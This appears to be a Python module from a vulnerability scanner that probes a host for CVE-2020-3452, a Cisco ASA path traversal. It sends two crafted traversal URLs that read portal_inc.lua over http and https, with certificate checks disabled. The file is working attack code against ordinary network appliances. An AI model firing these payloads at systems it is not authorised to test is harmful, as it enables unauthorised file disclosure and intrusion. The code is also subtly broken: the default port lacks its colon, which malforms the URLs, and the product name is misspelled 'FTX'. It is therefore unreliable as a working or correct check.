import requests
from intrack.lib.headers.headers_handler import user_agents
from intrack.lib.color_handler import print_colour

def check_CVE_2020_3452(ip, ports=None, timeout=5):
    headers = {"User-Agent": user_agents()}
    paths = [
        "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../",
        "/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua"
    ]
    protocols = ["http", "https"]
    if ports is None:
        ports = [443]
    else:
        ports = [f":{port}" for port in ports]
        
    for protocol in protocols:
        for port in ports:
            for path in paths:
                url = f"{protocol}://{ip}{port}{path}"
                try:
                    response = requests.get(url, verify=False, timeout=timeout, headers=headers)
                    if "Cisco Systems" in response.text and "SSL VPN Service" in response.text:
                        print_colour(f"[+] Target is vulnerable to CVE-2020-3452 (Cisco ASA/FTX Path Traversal): {url}")
                        return True
                except requests.RequestException:
                    continue
    return False 